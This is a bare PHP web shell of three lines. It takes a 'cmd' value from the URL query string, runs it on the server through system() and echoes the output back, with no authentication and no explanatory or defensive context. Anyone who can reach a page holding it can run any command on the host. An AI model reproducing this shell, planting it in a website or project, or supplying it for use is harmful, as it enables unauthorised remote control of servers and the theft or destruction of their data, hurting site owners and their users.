<?php 
if(isset($_GET['cmd'])){ echo "<pre>"; $cmd = ($_GET['cmd']); system($cmd); echo "</pre>"; die; }
?>
